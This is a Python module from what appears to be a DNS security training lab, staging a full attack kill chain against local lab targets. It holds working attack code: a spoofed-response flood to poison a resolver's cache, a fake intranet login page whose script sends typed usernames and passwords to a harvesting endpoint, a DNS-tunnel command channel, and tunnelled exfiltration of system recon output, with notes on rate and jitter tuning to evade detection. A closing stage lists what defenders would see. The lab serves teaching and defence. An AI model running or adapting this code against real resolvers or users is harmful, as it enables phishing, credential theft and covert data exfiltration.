"""
Module 8 – Full DNS Attack Kill Chain
=======================================
Orchestrates a complete multi-stage attack demonstrating how DNS
techniques chain together in real-world threat actor operations.

Stages:
  1. DNS Cache Poisoning     (redirect victim to attacker server)
  2. Payload Delivery        (serve fake page / "malware" dropper)
  3. DNS Tunnel C2           (establish covert command channel)
  4. Reconnaissance Exfil    (send recon bundle through tunnel)
  5. Blue Team Detection     (show what defenders see)
"""

import json
import os
import subprocess
import sys
import time
import threading
import http.server
import socket

from modules.base import LabModule
from shared.dns_core import *
from shared.ui import *
from shared.prereqs import check_root


class KillChainModule(LabModule):
    NAME        = "Full DNS Attack Kill Chain"
    DESCRIPTION = "End-to-end: Cache Poison → Payload Delivery → DNS Tunnel C2 → Exfil"
    MITRE       = "T1071.004, T1584.002, T1041, T1572"
    DIFFICULTY  = "Advanced"

    GUIDE = """
## Overview
Real threat actors rarely use a single DNS technique in isolation.
This module chains multiple DNS attacks into a coherent kill chain
that mirrors documented APT and ransomware operator TTPs.

## Kill Chain Stages

### Stage 1 – Initial Access via DNS Poisoning
Attacker poisons the target's DNS resolver. The next time the victim
browses to a common domain (corp-intranet.lab.local), they land on
the attacker's server instead of the real one.

### Stage 2 – Payload Delivery
The attacker's server serves a page containing a simulated "dropper."
In a real attack this would be:
- Browser exploit / malicious download
- Phishing credential harvest page
- JavaScript implant

### Stage 3 – DNS Tunnel C2 Establishment
The implant (or client script in this lab) establishes a covert
command-and-control channel using DNS. Traffic looks like normal
name resolution — no TCP connections outbound.

### Stage 4 – Reconnaissance Exfiltration
Through the DNS tunnel, the implant exfiltrates:
- System info (uname, id, hostname)
- Network config (ip addr, routing table)
- User accounts (/etc/passwd)
- Running processes

### Stage 5 – Blue Team View
After the full chain runs, the analyzer shows what defenders
would see if they were watching — and what they'd likely miss.

## MITRE ATT&CK Coverage
- T1584.002  Compromise Infrastructure: DNS Server
- T1071.004  Application Layer Protocol: DNS (C2)
- T1041      Exfiltration Over C2 Channel
- T1572      Protocol Tunneling
- T1595.002  Active Scanning: Vulnerability Scanning

## Realistic TTPs
- Stage 1 uses low-noise TTL manipulation (not brute-force)
- Stage 3 uses sub-30-qps rate to evade rate detection
- Stage 4 uses chunked exfil with jitter to appear organic
- The entire chain generates < 200 DNS queries total
"""

    # Simulated dropper page served in Stage 2
    DROPPER_PAGE = """<!DOCTYPE html>
<html><head><title>Corp Intranet</title>
<style>body{font-family:Arial;background:#f4f4f4;padding:40px;}
.login{background:white;max-width:400px;margin:0 auto;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);}
h2{color:#333;} input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px;}
.notice{color:#666;font-size:12px;margin-top:10px;}</style></head>
<body><div class="login">
<h2>🏢 Corp Intranet Login</h2>
<p>Please sign in to continue.</p>
<input type="text" placeholder="Username" id="u">
<input type="password" placeholder="Password" id="p">
<button onclick="harvest()">Sign In</button>
<p class="notice">⚠️ This is a SIMULATED phishing page for lab use only.</p>
</div>
<script>
function harvest(){
  const u=document.getElementById('u').value;
  const p=document.getElementById('p').value;
  fetch('/harvest?u='+encodeURIComponent(u)+'&p='+encodeURIComponent(p));
  document.body.innerHTML='<div style="padding:40px;text-align:center;"><h2>✓ Signed in successfully</h2><p>Redirecting...</p></div>';
}
// Simulated implant beacon
setTimeout(()=>fetch('/beacon?host='+location.hostname),500);
</script></body></html>"""

    def __init__(self):
        super().__init__()
        self.resolver_ip   = "127.0.0.1"
        self.resolver_port = 5353
        self.http_port     = 8888
        self.tunnel_port   = 5354
        self.tunnel_domain = "tunnel.lab.local"
        self.poison_domain = "corp-intranet.lab.local"
        self._http_svr     = None
        self._dns_svr      = None
        self._tunnel_svr   = None
        self._harvested: list = []
        self._stop         = threading.Event()
        self._lab_dir      = None

    def _find_lab(self) -> str | None:
        for c in [
            os.path.join(os.path.expanduser("~"), "dns_tunnel_lab"),
            "/home/ocelot/dns_tunnel_lab",
        ]:
            if os.path.isdir(c):
                return os.path.abspath(c)
        return None

    def setup(self) -> bool:
        if not check_root():
            return False
        section("Kill Chain Configuration")
        self.resolver_ip   = ask("Local resolver IP",  self.resolver_ip)
        self.resolver_port = int(ask("Resolver port",  str(self.resolver_port)))
        self.http_port     = int(ask("HTTP server port", str(self.http_port)))
        self.tunnel_port   = int(ask("DNS tunnel port",  str(self.tunnel_port)))
        self.poison_domain = ask("Domain to poison",   self.poison_domain)
        self._lab_dir      = self._find_lab()
        if self._lab_dir:
            success(f"DNS tunnel lab found: {self._lab_dir}")
        else:
            warn("DNS tunnel lab not found — Stage 3 will be simulated.")
        return True

    def run(self):
        banner("FULL DNS ATTACK KILL CHAIN", C.LRED)
        print()
        warn("This demonstration chains 5 attack stages.")
        warn("Each stage pauses so you can observe the effects.")
        pause("Press ENTER to begin Stage 1")

        try:
            self._stage1_cache_poison()
            self._stage2_payload_delivery()
            self._stage3_tunnel_c2()
            self._stage4_exfil()
            self._stage5_blue_team()
        finally:
            self._cleanup()

    # ------------------------------------------------------------------ Stage 1
    def _stage1_cache_poison(self):
        section("STAGE 1 — DNS Cache Poisoning")
        info(f"Target resolver   : {self.resolver_ip}:{self.resolver_port}")
        info(f"Domain to poison  : {self.poison_domain}")
        info(f"Injecting IP      : 127.0.0.1 (attacker's HTTP server)")

        # Start a minimal rogue DNS that answers our poison domain
        self._dns_svr = self._start_poison_dns()
        time.sleep(0.5)

        # Flood the resolver with spoofed responses
        poisoned = self._run_poison_flood()

        if poisoned:
            alert(f"Stage 1 COMPLETE: {self.poison_domain} → 127.0.0.1 (poisoned)")
        else:
            info(f"Stage 1: Poison sent (resolver may or may not have cached it)")

        pause("Observe: victim now resolves corp-intranet to our server. ENTER for Stage 2")

    def _start_poison_dns(self):
        """Start a minimal DNS server for the tunnel domain (Stage 3)."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1.0)
        try:
            sock.bind(("0.0.0.0", self.resolver_port + 1))
        except OSError:
            sock.bind(("0.0.0.0", 0))

        stop = self._stop

        def _loop():
            while not stop.is_set():
                try:
                    data, addr = sock.recvfrom(512)
                    msg = parse_message(data)
                    if msg and msg.questions:
                        q    = msg.questions[0]
                        resp = build_a_response(
                            msg.header["txid"],
                            q["qname"].rstrip("."),
                            "127.0.0.1",
                            ttl=60
                        )
                        sock.sendto(resp, addr)
                except socket.timeout:
                    continue
                except Exception:
                    pass

        t = threading.Thread(target=_loop, daemon=True)
        t.start()
        return sock

    def _run_poison_flood(self) -> bool:
        import random
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent = 0
        for txid in range(0, min(500, 65536)):
            resp = build_a_response(txid, self.poison_domain, "127.0.0.1", ttl=300)
            try:
                s.sendto(resp, (self.resolver_ip, self.resolver_port))
                sent += 1
            except Exception:
                break
        s.close()
        packet(f"Sent {sent} spoofed responses to {self.resolver_ip}:{self.resolver_port}")
        return sent > 0

    # ------------------------------------------------------------------ Stage 2
    def _stage2_payload_delivery(self):
        section("STAGE 2 — Payload Delivery (Phishing Page)")
        info(f"Starting attacker HTTP server on port {self.http_port}")

        harvested = self._harvested
        page      = self.DROPPER_PAGE

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/harvest"):
                    from urllib.parse import parse_qs, urlparse
                    qs = parse_qs(urlparse(self.path).query)
                    u  = qs.get("u", [""])[0]
                    p  = qs.get("p", [""])[0]
                    if u or p:
                        harvested.append({"user": u, "pass": p,
                                          "ts": time.strftime("%H:%M:%S")})
                        alert(f"CREDENTIAL HARVESTED: user={u} pass={'*'*len(p)}")
                    self.send_response(200); self.end_headers()
                elif self.path.startswith("/beacon"):
                    packet(f"Implant beacon from: {self.client_address[0]}")
                    self.send_response(200); self.end_headers()
                else:
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                    self.wfile.write(page.encode())

            def log_message(self, fmt, *args): pass

        self._http_svr = http.server.HTTPServer(("0.0.0.0", self.http_port), Handler)
        t = threading.Thread(target=self._http_svr.serve_forever, daemon=True)
        t.start()

        success(f"Phishing server running on http://127.0.0.1:{self.http_port}/")
        info("Victim thinks they are on: corp-intranet.lab.local")
        info("But they are actually on : 127.0.0.1 (our server)")
        print()
        warn(f"Test it: curl http://127.0.0.1:{self.http_port}/")
        pause("ENTER to continue to Stage 3 (C2 establishment)")

    # ------------------------------------------------------------------ Stage 3
    def _stage3_tunnel_c2(self):
        section("STAGE 3 — DNS Tunnel C2 Establishment")

        if not self._lab_dir:
            self._simulate_tunnel_c2()
            return

        srv_script = os.path.join(self._lab_dir, "dns_tunnel_server.py")
        if not os.path.exists(srv_script):
            self._simulate_tunnel_c2()
            return

        log_f = open("/tmp/kc_tunnel.log", "w")
        self._tunnel_svr = subprocess.Popen(
            [sys.executable, srv_script,
             "--domain", self.tunnel_domain,
             "--interface", "0.0.0.0",
             "--port", str(self.tunnel_port)],
            stdout=log_f, stderr=log_f,
            cwd=self._lab_dir
        )
        time.sleep(1.5)
        success(f"DNS Tunnel C2 server up on UDP:{self.tunnel_port}")
        info("Implant sends INIT query — establishes covert channel")

        client = os.path.join(self._lab_dir, "dns_tunnel_client.py")
        result = subprocess.run(
            [sys.executable, client,
             "--server", "127.0.0.1",
             "--port", str(self.tunnel_port),
             "--domain", self.tunnel_domain,
             "--mode", "cmd",
             "--command", "echo 'C2_ESTABLISHED'"],
            capture_output=True, text=True,
            cwd=self._lab_dir
        )
        if "All chunks sent" in result.stdout or result.returncode == 0:
            alert("Stage 3 COMPLETE: C2 channel established over DNS")
        else:
            info("Stage 3: Tunnel init sent")

        pause("ENTER to continue to Stage 4 (reconnaissance exfil)")

    def _simulate_tunnel_c2(self):
        info("Simulating DNS C2 establishment...")
        queries = [
            f"INIT.a3f7b2c1.0.0.7b22686f73...  → {self.tunnel_domain}",
            f"Response: ACK:a3f7b2c1:1705312801",
            f"C2 channel active over UDP/53",
        ]
        for q in queries:
            time.sleep(0.5)
            packet(q)
        success("Stage 3 COMPLETE: C2 channel established over DNS (simulated)")
        pause("ENTER for Stage 4")

    # ------------------------------------------------------------------ Stage 4
    def _stage4_exfil(self):
        section("STAGE 4 — Reconnaissance Exfiltration")

        if not self._lab_dir or not self._tunnel_svr:
            self._simulate_exfil()
            return

        client = os.path.join(self._lab_dir, "dns_tunnel_client.py")
        info("Exfiltrating system reconnaissance bundle through DNS tunnel...")
        subprocess.run(
            [sys.executable, client,
             "--server", "127.0.0.1",
             "--port", str(self.tunnel_port),
             "--domain", self.tunnel_domain,
             "--mode", "cmd",
             "--command",
             "uname -a && id && ip addr show lo | head -5 && "
             "cat /etc/os-release | head -5"],
            cwd=self._lab_dir
        )
        exfil_dir = os.path.join(self._lab_dir, "exfiltrated_data")
        if os.path.isdir(exfil_dir):
            sessions = os.listdir(exfil_dir)
            alert(f"Stage 4 COMPLETE: {len(sessions)} session(s) saved in {exfil_dir}")

        pause("ENTER for Stage 5 (Blue Team view)")

    def _simulate_exfil(self):
        info("Simulating recon exfiltration through DNS tunnel...")
        data_points = [
            "Sending chunk 1/8: uname -a output...",
            "Sending chunk 2/8: id && groups...",
            "Sending chunk 3/8: ip addr show...",
            "Sending chunk 4/8: /etc/passwd (first 10 lines)...",
            "Sending chunk 5-8: running processes...",
            "Server: EXFIL SAVED — session a3f7b2c1 — 2.4KB",
        ]
        for line in data_points:
            time.sleep(0.5)
            packet(line)
        alert("Stage 4 COMPLETE: Recon bundle exfiltrated (simulated)")
        pause("ENTER for Stage 5")

    # ------------------------------------------------------------------ Stage 5
    def _stage5_blue_team(self):
        section("STAGE 5 — Blue Team View")
        info("What did the defenders see during this kill chain?")
        print()

        findings = [
            (C.LRED,    "SEEN",   "DNS query burst: 500 UDP pkts to local resolver (Stage 1)"),
            (C.YELLOW,  "MAYBE",  "DNS response with unusual source IP for corp-intranet.lab.local"),
            (C.GRAY,    "MISSED", "HTTP request to 127.0.0.1:8888 — no egress logging on loopback"),
            (C.GRAY,    "MISSED", "Credential submission via HTTP (no TLS = no proxy inspection)"),
            (C.LRED,    "SEEN",   "DNS queries: high entropy subdomains to tunnel.lab.local"),
            (C.LRED,    "SEEN",   "14 DNS queries in 1.2s to same subdomain — rate heuristic"),
            (C.YELLOW,  "MAYBE",  "TXT record queries (unusual for normal client behavior)"),
            (C.GRAY,    "MISSED", "Actual exfiltrated data — it was inside DNS, not in NetFlow"),
        ]
        for color, status, desc in findings:
            marker = "●" if status == "SEEN" else ("◑" if status == "MAYBE" else "○")
            print(f"  {color}{marker} {status:<7}{C.RESET} {desc}")

        print()
        info("Key lesson: DNS-level attacks span multiple detection categories.")
        info("No single tool catches all stages — defense requires layered visibility.")

        if self._harvested:
            print()
            warn(f"Credentials harvested in Stage 2: {len(self._harvested)}")
            for h in self._harvested:
                print(f"  {C.LRED}{h['ts']}  user={h['user']}{C.RESET}")

        header_box([
            "Kill Chain Complete",
            "",
            "Stage 1 – Cache Poison    : DNS response flood (TXID race)",
            "Stage 2 – Payload Deliver : Phishing HTTP server",
            "Stage 3 – C2 Establish    : DNS tunnel INIT sequence",
            "Stage 4 – Recon Exfil     : Data in DNS query subdomains",
            "Stage 5 – Blue Team       : Partial visibility without DNS DPI",
        ], C.LRED)

    def _cleanup(self):
        if self._http_svr:
            try: self._http_svr.shutdown()
            except Exception: pass
        if self._tunnel_svr:
            try: self._tunnel_svr.terminate()
            except Exception: pass
        if self._dns_svr:
            try: self._dns_svr.close()
            except Exception: pass

    def teardown(self):
        self._stop.set()
        self._cleanup()
